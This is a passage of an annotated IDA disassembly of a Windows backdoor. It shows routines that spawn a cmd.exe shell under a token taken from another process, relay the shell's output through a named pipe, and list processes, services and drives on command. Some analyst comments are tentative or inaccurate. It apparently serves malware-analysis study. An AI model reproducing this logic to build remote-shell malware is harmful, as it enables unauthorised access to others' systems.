.text:00401AC1 loc_401AC1:             ; cleaning up the stack
.text:00401AC1 pop     edi
.text:00401AC2 pop     esi
.text:00401AC3 pop     ebx
.text:00401AC4 leave
.text:00401AC5 retn
.text:00401AC6
.text:00401AC6 loc_401AC6:             ; if we find a specific substring then we return 8
.text:00401AC6 push    8
.text:00401AC8 pop     eax
.text:00401AC9 jmp     short loc_401AC1
.text:00401AC9 looking_for_some_substring endp
.text:00401AC9
.text:00401ACB
.text:00401ACB
.text:00401ACB ; Attributes: bp-based frame
.text:00401ACB
.text:00401ACB ; int __cdecl PipeHandling(HANDLE hNamedPipe, DWORD ExitCode, int)
.text:00401ACB PipeHandling proc near
.text:00401ACB
.text:00401ACB var_C= dword ptr -0Ch
.text:00401ACB NumberOfBytesRead= dword ptr -8
.text:00401ACB BytesRead= dword ptr -4
.text:00401ACB hNamedPipe= dword ptr  8
.text:00401ACB ExitCode= dword ptr  0Ch
.text:00401ACB arg_8= dword ptr  10h
.text:00401ACB
.text:00401ACB push    ebp
.text:00401ACC mov     ebp, esp
.text:00401ACE sub     esp, 0Ch        ; setting up the stack
.text:00401AD1 push    ebx
.text:00401AD2 push    esi
.text:00401AD3 xor     ebx, ebx        ; clearing ebx
.text:00401AD5 push    edi
.text:00401AD6 mov     edi, [ebp+ExitCode] ; exit code is starting at 1
.text:00401AD9 mov     [ebp+BytesRead], ebx
.text:00401ADC mov     [ebp+NumberOfBytesRead], ebx
.text:00401ADF xor     esi, esi        ; zeroing out all the variables
.text:00401AE1 mov     [ebp+var_C], ebx
.text:00401AE4
.text:00401AE4 loc_401AE4:
.text:00401AE4 lea     eax, [ebp+ExitCode]
.text:00401AE7 push    eax             ; lpExitCode
.text:00401AE8 push    hObject         ; hProcess
.text:00401AEE call    ds:GetExitCodeProcess
.text:00401AF4 cmp     [ebp+ExitCode], 103h ; if the exit code is not 103h then we shut down the pipe
.text:00401AFB jnz     short loc_401B63
.text:00401AFD push    ebx             ; lpBytesLeftThisMessage
.text:00401AFE lea     eax, [ebp+BytesRead]
.text:00401B01 push    ebx             ; lpTotalBytesAvail
.text:00401B02 push    eax             ; lpBytesRead
.text:00401B03 mov     eax, 10000h     ; buffer is 10000h in size
.text:00401B08 sub     eax, esi
.text:00401B0A push    eax             ; nBufferSize
.text:00401B0B lea     eax, [esi+edi]
.text:00401B0E push    eax             ; lpBuffer
.text:00401B0F push    [ebp+hNamedPipe] ; hNamedPipe
.text:00401B12 call    ds:PeekNamedPipe ; copying data from the pipe to the buffer
.text:00401B18 cmp     [ebp+arg_8], ebx
.text:00401B1B jz      short loc_401B35
.text:00401B1D cmp     [ebp+BytesRead], ebx ; if there were no bytes read then we sleep
.text:00401B20 jnz     short loc_401B35
.text:00401B22 cmp     [ebp+var_C], 0Ah ; It's only allowed to sleep 10 times before it stops trying
.text:00401B26 jnb     short loc_401B35
.text:00401B28 push    32h ; '2'       ; dwMilliseconds
.text:00401B2A call    ds:Sleep        ; sleep for 50 milliseconds
.text:00401B30 inc     [ebp+var_C]     ; var_C is the number of rounds
.text:00401B33 jmp     short loc_401AE4
.text:00401B35
.text:00401B35 loc_401B35:
.text:00401B35 cmp     [ebp+BytesRead], ebx
.text:00401B38 mov     [ebp+NumberOfBytesRead], ebx
.text:00401B3B jz      short loc_401BA2 ; check the number of bytes that are read and if it is zero/null then we exit the subroutine
.text:00401B3D lea     eax, [ebp+NumberOfBytesRead]
.text:00401B40 push    ebx             ; lpOverlapped
.text:00401B41 push    eax             ; lpNumberOfBytesRead
.text:00401B42 lea     eax, [esi+edi]  ; We try to read from the pipe here again
.text:00401B45 push    [ebp+BytesRead] ; nNumberOfBytesToRead
.text:00401B48 push    eax             ; lpBuffer
.text:00401B49 push    [ebp+hNamedPipe] ; hFile
.text:00401B4C call    ds:ReadFile     ; If we aren't able to read from the pipe then we exit out of the subroutine
.text:00401B52 test    eax, eax        ; check if the return value is 0
.text:00401B54 jz      short loc_401BA2
.text:00401B56 add     esi, [ebp+NumberOfBytesRead]
.text:00401B59 cmp     [ebp+NumberOfBytesRead], ebx
.text:00401B5C mov     [ebp+arg_8], ebx
.text:00401B5F jz      short loc_401BA2 ; if the number of bytes read is 0 then we clear arg_8 and leave the subroutine
.text:00401B61 jmp     short loc_401AE4
.text:00401B63
.text:00401B63 loc_401B63:             ; hObject
.text:00401B63 push    hObject
.text:00401B69 mov     esi, ds:CloseHandle
.text:00401B6F mov     dword_4047A0, ebx
.text:00401B75 call    esi ; CloseHandle ; closing down the pipe
.text:00401B77 push    dword_404774    ; hObject
.text:00401B7D call    esi ; CloseHandle
.text:00401B7F push    10h             ; Size
.text:00401B81 push    ebx             ; Val
.text:00401B82 push    offset hObject  ; void *
.text:00401B87 call    memset          ; clearing out the pipe's data
.text:00401B8C push    offset aProcessCmdExeE ; "Process cmd.exe exited!\r\n"
.text:00401B91 push    edi             ; Destination
.text:00401B92 call    strcpy          ; edi stores the location of the cmd exited string
.text:00401B97 push    edi             ; Str
.text:00401B98 call    strlen
.text:00401B9D add     esp, 18h
.text:00401BA0 mov     esi, eax        ; esi stores the length of the cmd exited string
.text:00401BA2
.text:00401BA2 loc_401BA2:
.text:00401BA2 mov     eax, esi
.text:00401BA4 pop     edi
.text:00401BA5 pop     esi
.text:00401BA6 pop     ebx
.text:00401BA7 leave                   ; cleaning the stack and eax stores either the length of the cmd exited string or the total number of bytes read
.text:00401BA8 retn
.text:00401BA8 PipeHandling endp
.text:00401BA8
.text:00401BA9
.text:00401BA9
.text:00401BA9 ; Attributes: bp-based frame
.text:00401BA9
.text:00401BA9 ; int __cdecl TryToStartProcessAsUser(char *Destination, int, HANDLE TokenHandle)
.text:00401BA9 TryToStartProcessAsUser proc near
.text:00401BA9
.text:00401BA9 Source= byte ptr -26Ch
.text:00401BA9 Dst= byte ptr -16Ch
.text:00401BA9 Buffer= byte ptr -64h
.text:00401BA9 StartupInfo= _STARTUPINFOA ptr -44h
.text:00401BA9 Destination= dword ptr  8
.text:00401BA9 arg_4= dword ptr  0Ch
.text:00401BA9 TokenHandle= dword ptr  10h
.text:00401BA9
.text:00401BA9 push    ebp
.text:00401BAA mov     ebp, esp
.text:00401BAC sub     esp, 26Ch
.text:00401BB2 cmp     [ebp+arg_4], 0FFFFFFFFh ; checking if [ebp + arg_4] is equal to a max 32 int number
.text:00401BB6 push    ebx
.text:00401BB7 push    esi
.text:00401BB8 push    edi
.text:00401BB9 jz      loc_401E0D      ; if arg_4 is max int jump, and exit subroutine
.text:00401BBF mov     esi, [ebp+TokenHandle]
.text:00401BC2 cmp     esi, 0FFFFFFFFh
.text:00401BC5 jz      loc_401E0D      ; if tokenHandle is max 32 bit int, jump and exit
.text:00401BCB xor     edi, edi        ; clear edi
.text:00401BCD cmp     dword_4047A0, edi ; check if dword_4047A0 is empty
.text:00401BD3 jnz     loc_401DDC      ; if dword_4047A0 is not empty jump
.text:00401BD9 mov     ebx, 104h       ; ebx = 260
.text:00401BDE lea     eax, [ebp+Dst]  ; [ebp + Dst] = lpDst
.text:00401BE4 push    ebx             ; nSize
.text:00401BE5 push    eax             ; lpDst
.text:00401BE6 push    offset Src      ; lpSrc, "%ComSpec%"
.text:00401BEB call    ds:ExpandEnvironmentStringsA ; replacing %ComSpec% dynamically with string
.text:00401BF1 test    eax, eax        ; checking if conversion was successful
.text:00401BF3 jnz     short loc_401C16 ; if successful jump
.text:00401BF5 lea     eax, [ebp+Dst]
.text:00401BFB push    ebx             ; uSize
.text:00401BFC push    eax             ; lpBuffer
.text:00401BFD call    ds:GetSystemDirectoryA
.text:00401C03 lea     eax, [ebp+Dst]
.text:00401C09 push    offset aCmdExe  ; "\\cmd.exe"
.text:00401C0E push    eax             ; Destination
.text:00401C0F call    strcat          ; concatenating current directory with cmd.exe
.text:00401C14 pop     ecx
.text:00401C15 pop     ecx
.text:00401C16
.text:00401C16 loc_401C16:
.text:00401C16 lea     eax, [ebp+Dst]
.text:00401C1C push    eax             ; lpFileName
.text:00401C1D call    ds:GetFileAttributesA ; getting attributes of either %ComSpec% file, or file created in last block
.text:00401C23 cmp     eax, 0FFFFFFFFh ; checking if INVALID_FILE_ATTRIBUTES
.text:00401C26 jnz     short loc_401C52 ; if no error, jump
.text:00401C28 call    ds:GetLastError
.text:00401C2E push    eax
.text:00401C2F lea     eax, [ebp+Buffer]
.text:00401C32 push    offset aGetfileattribu ; "GetFileAttributes Error code: %d\r\n"
.text:00401C37 push    eax             ; Buffer
.text:00401C38 call    ds:sprintf      ; print error related to getting file attributes
.text:00401C3E lea     eax, [ebp+Buffer]
.text:00401C41 push    eax             ; Source
.text:00401C42 push    [ebp+Destination] ; Destination
.text:00401C45 call    strcat
.text:00401C4A add     esp, 14h
.text:00401C4D jmp     loc_401DBC      ; dword = applicationName, only set if process successful
.text:00401C52
.text:00401C52 loc_401C52:
.text:00401C52 push    offset aCmdpath ; "\nCmdPath="
.text:00401C57 push    [ebp+Destination] ; Destination
.text:00401C5A call    strcat
.text:00401C5F lea     eax, [ebp+Dst]
.text:00401C65 push    eax             ; Source
.text:00401C66 push    [ebp+Destination] ; Destination
.text:00401C69 call    strcat
.text:00401C6E push    offset asc_40420C ; "\n"
.text:00401C73 push    [ebp+Destination] ; Destination
.text:00401C76 call    strcat
.text:00401C7B push    44h ; 'D'
.text:00401C7D lea     eax, [ebp+StartupInfo] ; this block is formatting the string to run a command
.text:00401C80 pop     ebx
.text:00401C81 push    ebx             ; Size
.text:00401C82 push    edi             ; Val
.text:00401C83 push    eax             ; void *
.text:00401C84 call    memset          ; edi is empty, using memset to clear eax?
.text:00401C89 mov     eax, [ebp+arg_4]
.text:00401C8C add     esp, 24h
.text:00401C8F mov     [ebp+StartupInfo.hStdInput], eax
.text:00401C92 mov     eax, Str
.text:00401C97 cmp     eax, edi        ; edi is empty, checking if Str is empty
.text:00401C99 mov     [ebp+StartupInfo.cb], ebx
.text:00401C9C mov     [ebp+StartupInfo.dwFlags], 101h
.text:00401CA3 mov     [ebp+StartupInfo.wShowWindow], di
.text:00401CA7 mov     [ebp+StartupInfo.hStdError], esi
.text:00401CAA mov     [ebp+StartupInfo.hStdOutput], esi
.text:00401CAD jz      loc_401D87      ; if Str is empty, jump
.text:00401CB3 cmp     lpServiceName, edi ; if lpServiceName is not empty, jump
.text:00401CB9 jnz     loc_401D87
.text:00401CBF push    eax             ; String
.text:00401CC0 call    ds:atol         ; converting string number to long
.text:00401CC6 cmp     eax, edi        ; checking if number is 0
.text:00401CC8 pop     ecx
.text:00401CC9 jz      loc_401D87      ; if string == 0 jump
.text:00401CCF push    eax             ; dwProcessId, processId to start
.text:00401CD0 push    edi             ; bInheritHandle
.text:00401CD1 push    1F0FFFh         ; dwDesiredAccess
.text:00401CD6 call    ds:OpenProcess
.text:00401CDC mov     ebx, eax
.text:00401CDE cmp     ebx, 0FFFFFFFFh ; checking if opening process failed
.text:00401CE1 jnz     short loc_401D13 ; jump if opening process succeeded
.text:00401CE3 call    ds:GetLastError
.text:00401CE9 push    eax
.text:00401CEA lea     eax, [ebp+Source]
.text:00401CF0 push    offset aOpenpFailedWit ; "OpenP failed with %d!\n"
.text:00401CF5 push    eax             ; Buffer
.text:00401CF6 call    ds:sprintf      ; if opening process failed, print some status messages
.text:00401CFC lea     eax, [ebp+Source]
.text:00401D02 push    eax             ; Source
.text:00401D03 push    [ebp+Destination] ; Destination
.text:00401D06 call    strcat
.text:00401D0B add     esp, 14h
.text:00401D0E jmp     loc_401E0D
.text:00401D13
.text:00401D13 loc_401D13:
.text:00401D13 lea     eax, [ebp+TokenHandle]
.text:00401D16 push    eax             ; TokenHandle
.text:00401D17 push    0Bh             ; DesiredAccess
.text:00401D19 push    ebx             ; ProcessHandle
.text:00401D1A call    ds:OpenProcessToken
.text:00401D20 test    eax, eax        ; checking if getting token was successful
.text:00401D22 jz      short loc_401D53 ; if getting token not successful jump
.text:00401D24 lea     eax, [ebp+StartupInfo]
.text:00401D27 push    offset hObject  ; lpProcessInformation
.text:00401D2C push    eax             ; lpStartupInfo
.text:00401D2D push    edi             ; lpCurrentDirectory
.text:00401D2E push    edi             ; lpEnvironment
.text:00401D2F push    edi             ; dwCreationFlags
.text:00401D30 push    1
.text:00401D32 lea     eax, [ebp+Dst]
.text:00401D38 pop     esi
.text:00401D39 push    esi             ; bInheritHandles
.text:00401D3A push    edi             ; lpThreadAttributes
.text:00401D3B push    edi             ; lpProcessAttributes
.text:00401D3C push    eax             ; lpCommandLine
.text:00401D3D push    edi             ; lpApplicationName
.text:00401D3E push    [ebp+TokenHandle] ; hToken
.text:00401D41 call    ds:CreateProcessAsUserA ; creates new process under security context of user specified by token
.text:00401D47 test    eax, eax        ; check if creating process was successful
.text:00401D49 jz      short loc_401D7E ; if starting process not successful jump
.text:00401D4B mov     dword_4047A0, esi ; dword_4047A0, bInheritHandles
.text:00401D51 jmp     short loc_401D7E
.text:00401D53
.text:00401D53 loc_401D53:
.text:00401D53 call    ds:GetLastError
.text:00401D59 push    eax
.text:00401D5A lea     eax, [ebp+Source]
.text:00401D60 push    offset aOpentFailedWit ; "OpenT failed with %d!\n"
.text:00401D65 push    eax             ; Buffer
.text:00401D66 call    ds:sprintf      ; print OpenT failed with <last error>!
.text:00401D6C lea     eax, [ebp+Source]
.text:00401D72 push    eax             ; Source
.text:00401D73 push    [ebp+Destination] ; Destination
.text:00401D76 call    strcat
.text:00401D7B add     esp, 14h
.text:00401D7E
.text:00401D7E loc_401D7E:             ; hObject, ebx = handle to object
.text:00401D7E push    ebx
.text:00401D7F call    ds:CloseHandle
.text:00401D85 jmp     short loc_401DB1
.text:00401D87
.text:00401D87 loc_401D87:
.text:00401D87 lea     eax, [ebp+StartupInfo]
.text:00401D8A push    offset hObject  ; lpProcessInformation
.text:00401D8F push    eax             ; lpStartupInfo
.text:00401D90 push    edi             ; lpCurrentDirectory
.text:00401D91 push    edi             ; lpEnvironment
.text:00401D92 push    edi             ; dwCreationFlags
.text:00401D93 push    1
.text:00401D95 lea     eax, [ebp+Dst]
.text:00401D9B pop     esi
.text:00401D9C push    esi             ; bInheritHandles
.text:00401D9D push    edi             ; lpThreadAttributes
.text:00401D9E push    edi             ; lpProcessAttributes
.text:00401D9F push    eax             ; lpCommandLine
.text:00401DA0 push    edi             ; lpApplicationName
.text:00401DA1 call    ds:CreateProcessA ; if getting user token failed, create proocess without user security context
.text:00401DA7 test    eax, eax        ; testing if creating process was successful
.text:00401DA9 jz      short loc_401DB1 ; jump if creating process failed
.text:00401DAB mov     dword_4047A0, esi ; esi = bInheritHandles
.text:00401DB1
.text:00401DB1 loc_401DB1:             ; dwMilliseconds
.text:00401DB1 push    1F4h
.text:00401DB6 call    ds:Sleep        ; sleep for 500ms
.text:00401DBC
.text:00401DBC loc_401DBC:             ; dword = applicationName, only set if process successful
.text:00401DBC cmp     dword_4047A0, edi
.text:00401DC2 jz      short loc_401DD5 ; jump if process starting failed
.text:00401DC4 push    offset aShellStartedSu ; "Shell started successfully!\r\n"
.text:00401DC9
.text:00401DC9 loc_401DC9:             ; Destination
.text:00401DC9 push    [ebp+Destination]
.text:00401DCC call    strcat
.text:00401DD1 pop     ecx
.text:00401DD2 pop     ecx
.text:00401DD3 jmp     short loc_401E0D
.text:00401DD5
.text:00401DD5 loc_401DD5:
.text:00401DD5 push    offset aShellStartedFa ; "Shell started fail!\r\n"
.text:00401DDA jmp     short loc_401DC9
.text:00401DDC
.text:00401DDC loc_401DDC:
.text:00401DDC push    offset aStartedAlready ; "Started already,"
.text:00401DE1 push    [ebp+Destination] ; Destination
.text:00401DE4 call    strcat
.text:00401DE9 push    dword_404778
.text:00401DEF lea     eax, [ebp+Buffer]
.text:00401DF2 push    offset aAndThePidIsD ; " and the PID is %d\r\n"
.text:00401DF7 push    eax             ; Buffer
.text:00401DF8 call    ds:sprintf      ; if process is already started print some status messages
.text:00401DFE lea     eax, [ebp+Buffer]
.text:00401E01 push    eax             ; Source
.text:00401E02 push    [ebp+Destination] ; Destination
.text:00401E05 call    strcat
.text:00401E0A add     esp, 1Ch
.text:00401E0D
.text:00401E0D loc_401E0D:
.text:00401E0D pop     edi
.text:00401E0E pop     esi
.text:00401E0F pop     ebx
.text:00401E10 leave
.text:00401E11 retn
.text:00401E11 TryToStartProcessAsUser endp
.text:00401E11
.text:00401E12
.text:00401E12
.text:00401E12 ; Attributes: bp-based frame
.text:00401E12
.text:00401E12 ; int __cdecl LoopingThroughDrives(char *Destination)
.text:00401E12 LoopingThroughDrives proc near
.text:00401E12
.text:00401E12 var_464= dword ptr -464h
.text:00401E12 pe= PROCESSENTRY32 ptr -240h
.text:00401E12 Buffer= byte ptr -118h
.text:00401E12 pcbBytesNeeded= dword ptr -18h
.text:00401E12 String1= byte ptr -14h
.text:00401E12 var_13= byte ptr -13h
.text:00401E12 var_10= dword ptr -10h
.text:00401E12 hSCObject= dword ptr -0Ch
.text:00401E12 ServicesReturned= dword ptr -8
.text:00401E12 var_1= byte ptr -1
.text:00401E12 Destination= dword ptr  8
.text:00401E12
.text:00401E12 push    ebp
.text:00401E13 mov     ebp, esp
.text:00401E15 sub     esp, 464h
.text:00401E1B mov     eax, Str
.text:00401E20 push    ebx
.text:00401E21 xor     ebx, ebx        ; clear ebx
.text:00401E23 push    esi
.text:00401E24 cmp     eax, ebx        ; check if str is empty
.text:00401E26 push    edi
.text:00401E27 jnz     short loc_401E33 ; jump if str isnt empty
.text:00401E29 push    offset aSyntaxErrorUsa ; "Syntax error!\tUsage:\tlist </p|/s|/d>"...
.text:00401E2E jmp     loc_401F5A
.text:00401E33
.text:00401E33 loc_401E33:
.text:00401E33 mov     esi, ds:_strcmpi
.text:00401E39 push    eax             ; String2
.text:00401E3A push    offset aP       ; "/p"
.text:00401E3F call    esi ; _strcmpi  ; check if string is /p
.text:00401E41 pop     ecx
.text:00401E42 test    eax, eax        ; if strings are same eax = 0
.text:00401E44 pop     ecx
.text:00401E45 jnz     loc_401EF6      ; if strings different, jump
.text:00401E4B mov     edi, 128h
.text:00401E50 lea     eax, [ebp+pe]
.text:00401E56 push    edi             ; Size
.text:00401E57 push    ebx             ; Val
.text:00401E58 push    eax             ; void *
.text:00401E59 call    memset          ; clearing [ebp + pe]
.text:00401E5E mov     esi, 224h
.text:00401E63 lea     eax, [ebp+var_464]
.text:00401E69 push    esi             ; Size
.text:00401E6A push    ebx             ; Val
.text:00401E6B push    eax             ; void *
.text:00401E6C call    memset          ; clearing [ebp + var_464]
.text:00401E71 add     esp, 18h
.text:00401E74 push    ebx             ; th32ProcessID
.text:00401E75 push    2               ; dwFlags
.text:00401E77 call    CreateToolhelp32Snapshot ; take a snapshot of specified process, often used by malware
.text:00401E7C mov     ebx, eax        ; ; ebx = open handle to specified snapshot
.text:00401E7E cmp     ebx, 0FFFFFFFFh ; check if getting handle was successful
.text:00401E81 jnz     short loc_401E8D ; jump if getting handle was successful
.text:00401E83 push    offset aListProcessFai ; "list process failed!\r\n"
.text:00401E88 jmp     loc_401F5A
.text:00401E8D
.text:00401E8D loc_401E8D:
.text:00401E8D lea     eax, [ebp+pe]
.text:00401E93 mov     [ebp+pe.dwSize], edi
.text:00401E99 push    eax             ; lppe
.text:00401E9A push    ebx             ; hSnapshot
.text:00401E9B mov     [ebp+var_464], esi
.text:00401EA1 call    Process32First  ; retrieves information about the first process encountered in a system snapshot
.text:00401EA6
.text:00401EA6 loc_401EA6:             ; check if Process32First/Next was successful
.text:00401EA6 test    eax, eax
.text:00401EA8 jz      short loc_401EEA ; jump if not successful
.text:00401EAA push    [ebp+pe.th32ProcessID]
.text:00401EB0 lea     eax, [ebp+pe.szExeFile]
.text:00401EB6 push    eax
.text:00401EB7 lea     eax, [ebp+Buffer]
.text:00401EBD push    offset a26s5d   ; "%-26s %5d\r\n"
.text:00401EC2 push    eax             ; Buffer
.text:00401EC3 call    ds:sprintf      ; print formatted string of buffer
.text:00401EC9 lea     eax, [ebp+Buffer]
.text:00401ECF push    eax             ; Source
.text:00401ED0 push    [ebp+Destination] ; Destination
.text:00401ED3 call    strcat          ; concatenate buffer with destination
.text:00401ED8 add     esp, 18h
.text:00401EDB lea     eax, [ebp+pe]
.text:00401EE1 push    eax             ; lppe
.text:00401EE2 push    ebx             ; hSnapshot
.text:00401EE3 call    Process32Next   ; retrieves information about the next process recorded in a system snapshot
.text:00401EE8 jmp     short loc_401EA6 ; check if Process32First/Next was successful
.text:00401EEA
.text:00401EEA loc_401EEA:             ; hObject
.text:00401EEA push    ebx
.text:00401EEB call    ds:CloseHandle  ; close snapshot handle if failed
.text:00401EF1 jmp     loc_40212D
.text:00401EF6
.text:00401EF6 loc_401EF6:             ; String2
.text:00401EF6 push    Str
.text:00401EFC push    offset aS       ; "/s"
.text:00401F01 call    esi ; _strcmpi  ; if string isn't /p, check if its /s
.text:00401F03 pop     ecx
.text:00401F04 test    eax, eax        ; if strings are same eax = 0
.text:00401F06 pop     ecx
.text:00401F07 jnz     loc_401FD0      ; if strings different, jump
.text:00401F0D push    4               ; dwDesiredAccess
.text:00401F0F push    ebx             ; lpDatabaseName
.text:00401F10 push    ebx             ; lpMachineName
.text:00401F11 call    ds:OpenSCManagerA ; establishes a connection to the service control manager on the specified computer and opens control manager database
.text:00401F17 cmp     eax, ebx        ; ebx is empty, checking if handle is valid
.text:00401F19 mov     [ebp+hSCObject], eax
.text:00401F1C jz      short loc_401F55 ; if function failed, jump
.text:00401F1E push    ebx             ; pszGroupName
.text:00401F1F lea     ecx, [ebp+ServicesReturned]
.text:00401F22 push    ebx             ; lpResumeHandle
.text:00401F23 push    ecx             ; lpServicesReturned
.text:00401F24 lea     ecx, [ebp+pcbBytesNeeded]
.text:00401F27 mov     esi, ds:EnumServicesStatusExA
.text:00401F2D push    ecx             ; pcbBytesNeeded
.text:00401F2E push    ebx             ; cbBufSize
.text:00401F2F push    ebx             ; lpServices
.text:00401F30 push    1               ; dwServiceState
.text:00401F32 push    30h ; '0'       ; dwServiceType
.text:00401F34 push    ebx             ; InfoLevel
.text:00401F35 push    eax             ; hSCManager
.text:00401F36 call    esi ; EnumServicesStatusExA ; enumerates services in specified service control manager database
.text:00401F38 mov     eax, [ebp+pcbBytesNeeded] ; calling this function here to see if there's space to allocate it's output?
.text:00401F3B lea     edi, [eax+1]
.text:00401F3E push    edi             ; unsigned int
.text:00401F3F call    ??2@YAPAXI@Z    ; operator new(uint)
.text:00401F44 cmp     eax, ebx        ; check if allocating pointer was successful
.text:00401F46 pop     ecx
.text:00401F47 mov     [ebp+var_10], eax ; var_10 = pointer to [eax+1]
.text:00401F4A jnz     short loc_401F69 ; jump if allocating space successful
.text:00401F4C push    [ebp+hSCObject] ; hSCObject
.text:00401F4F call    ds:CloseServiceHandle
.text:00401F55
.text:00401F55 loc_401F55:
.text:00401F55 push    offset aListServiceFai ; "list service failed!\r\n"
.text:00401F5A
.text:00401F5A loc_401F5A:             ; Destination
.text:00401F5A push    [ebp+Destination]
.text:00401F5D call    strcat          ; concatenate error with destination, essentially putting error wherever destination is
.text:00401F62 pop     ecx
.text:00401F63 pop     ecx
.text:00401F64 jmp     loc_40212D
.text:00401F69
.text:00401F69 loc_401F69:             ; pszGroupName
.text:00401F69 push    ebx
.text:00401F6A lea     ecx, [ebp+ServicesReturned]
.text:00401F6D push    ebx             ; lpResumeHandle
.text:00401F6E push    ecx             ; lpServicesReturned
.text:00401F6F lea     ecx, [ebp+pcbBytesNeeded]
.text:00401F72 push    ecx             ; pcbBytesNeeded
.text:00401F73 push    edi             ; cbBufSize
.text:00401F74 push    eax             ; lpServices
.text:00401F75 push    1               ; dwServiceState
.text:00401F77 push    30h ; '0'       ; dwServiceType
.text:00401F79 push    ebx             ; InfoLevel
.text:00401F7A push    [ebp+hSCObject] ; hSCManager
.text:00401F7D call    esi ; EnumServicesStatusExA
.text:00401F7F cmp     [ebp+ServicesReturned], ebx ; checking if services returned is empty
.text:00401F82 jbe     short loc_401FB9 ; jump if <= 0 services returned
.text:00401F84 mov     esi, [ebp+var_10] ; esi pointing to space that can hold output of EnumServicesStatusExA
.text:00401F87
.text:00401F87 loc_401F87:
.text:00401F87 push    dword ptr [esi+4]
.text:00401F8A lea     eax, [ebp+Buffer]
.text:00401F90 push    dword ptr [esi]
.text:00401F92 push    offset a24sS    ; "%-24s %s\r\n"
.text:00401F97 push    eax             ; Buffer
.text:00401F98 call    ds:sprintf      ; printing buffer formatted by a24sS
.text:00401F9E lea     eax, [ebp+Buffer]
.text:00401FA4 push    eax             ; Source
.text:00401FA5 push    [ebp+Destination] ; Destination
.text:00401FA8 call    strcat          ; concatenate formatted buffer with destination essentially putting string at destination
.text:00401FAD add     esp, 18h
.text:00401FB0 inc     ebx
.text:00401FB1 add     esi, 2Ch ; ','
.text:00401FB4 cmp     ebx, [ebp+ServicesReturned] ; loop until all services have been accounted for
.text:00401FB7 jb      short loc_401F87
.text:00401FB9
.text:00401FB9 loc_401FB9:             ; void *
.text:00401FB9 push    [ebp+var_10]
.text:00401FBC call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00401FC1 pop     ecx             ; delete allocated space
.text:00401FC2 push    [ebp+hSCObject] ; hSCObject
.text:00401FC5 call    ds:CloseServiceHandle ; close handle
.text:00401FCB jmp     loc_40212D
.text:00401FD0
.text:00401FD0 loc_401FD0:             ; String2
.text:00401FD0 push    Str
.text:00401FD6 push    offset aD       ; "/d"
.text:00401FDB call    esi ; _strcmpi  ; if string isn't /s, check if its /d
.text:00401FDD pop     ecx
.text:00401FDE test    eax, eax        ; if strings are same eax = 0
.text:00401FE0 pop     ecx
.text:00401FE1 jnz     loc_40212D      ; if strings different, jump
.text:00401FE7 mov     [ebp+hSCObject], ebx
.text:00401FEA call    ds:GetLogicalDrives ; fills buffer with strings that specify valid drives in the system
.text:00401FF0 mov     esi, ds:sprintf
.text:00401FF6 mov     [ebp+ServicesReturned], eax
.text:00401FF9 lea     eax, [ebp+Buffer]
.text:00401FFF push    offset aVolumeOnThisCo ; "Volume on this computer:\r\nVolume\tTyp"...
.text:00402004 push    eax             ; Buffer
.text:00402005 mov     [ebp+var_1], 41h ; 'A'
.text:00402009 call    esi ; sprintf   ; print valid drives on computer in formatted string
.text:0040200B mov     edi, [ebp+Destination]
.text:0040200E lea     eax, [ebp+Buffer]
.text:00402014 push    eax             ; Source
.text:00402015 push    edi             ; Destination
.text:00402016 call    strcat          ; concatenate formatted string concatenated to destination
.text:0040201B add     esp, 10h
.text:0040201E
.text:0040201E loc_40201E:             ; check if valid drives is empty
.text:0040201E cmp     [ebp+ServicesReturned], ebx
.text:00402021 jz      loc_40210C      ; jump if valid drives is empty
.text:00402027 test    byte ptr [ebp+ServicesReturned], 1
.text:0040202B jz      loc_402101      ; jump if valid drives empty
.text:00402031 movsx   eax, [ebp+var_1]
.text:00402035 push    eax
.text:00402036 lea     eax, [ebp+Buffer]
.text:0040203C push    offset aC       ; "%c:\t"
.text:00402041 push    eax             ; Buffer
.text:00402042 call    esi ; sprintf   ; print formatted string of drive name
.text:00402044 lea     eax, [ebp+Buffer]
.text:0040204A push    eax             ; Source
.text:0040204B push    edi             ; Destination
.text:0040204C call    strcat          ; putting name of drive in destination
.text:00402051 mov     al, [ebp+var_1]
.text:00402054 add     esp, 14h
.text:00402057 mov     [ebp+String1], al ; string1 = var_1
.text:0040205A lea     eax, [ebp+String1]
.text:0040205D push    offset asc_4042CC ; ":\\"
.text:00402062 push    eax             ; lpString1
.text:00402063 mov     [ebp+var_13], bl
.text:00402066 call    ds:lstrcatA     ; creating root directory for the drive
.text:0040206C lea     eax, [ebp+String1]
.text:0040206F push    eax             ; lpRootPathName
.text:00402070 call    ds:GetDriveTypeA ; determining what type of drive the disk is, removable? cd? etc.
.text:00402076 sub     eax, ebx
.text:00402078 jz      short loc_4020B6 ; if eax - ebx = 0, jump
.text:0040207A dec     eax
.text:0040207B jz      short loc_4020AF ; DRIVE_NO_ROOT_DIR
.text:0040207D dec     eax
.text:0040207E jz      short loc_4020A8 ; DRIVE_REMOVABLE
.text:00402080 dec     eax
.text:00402081 jz      short loc_4020A1 ; DRIVE_FIXED
.text:00402083 dec     eax
.text:00402084 jz      short loc_40209A ; DRIVE_REMOTE
.text:00402086 dec     eax
.text:00402087 jz      short loc_402093 ; DRIVE_CDROM
.text:00402089 dec     eax
.text:0040208A jnz     short loc_4020C3
.text:0040208C push    offset aRamdisk ; "Ramdisk\t\t"
.text:00402091 jmp     short loc_4020BB ; DRIVE_RAMDISK
.text:00402093
.text:00402093 loc_402093:             ; DRIVE_CDROM
.text:00402093 push    offset aCdRom
.text:00402098 jmp     short loc_4020BB
.text:0040209A
.text:0040209A loc_40209A:             ; DRIVE_REMOTE
.text:0040209A push    offset aRemote
.text:0040209F jmp     short loc_4020BB
.text:004020A1
.text:004020A1 loc_4020A1:             ; DRIVE_FIXED
.text:004020A1 push    offset aFixed
.text:004020A6 jmp     short loc_4020BB
.text:004020A8
.text:004020A8 loc_4020A8:             ; DRIVE_REMOVABLE
.text:004020A8 push    offset aRemoveable
.text:004020AD jmp     short loc_4020BB
.text:004020AF
.text:004020AF loc_4020AF:             ; DRIVE_NO_ROOT_DIR
.text:004020AF push    offset aInvalid
.text:004020B4 jmp     short loc_4020BB
.text:004020B6
.text:004020B6 loc_4020B6:             ; DRIVE_UNKNOWN=0
.text:004020B6 push    offset aUnkown
.text:004020BB
.text:004020BB loc_4020BB:             ; Destination
.text:004020BB push    edi
.text:004020BC call    strcat          ; putting type of drive in destination
.text:004020C1 pop     ecx
.text:004020C2 pop     ecx
.text:004020C3
.text:004020C3 loc_4020C3:             ; nFileSystemNameSize
.text:004020C3 push    ebx
.text:004020C4 push    ebx             ; lpFileSystemNameBuffer
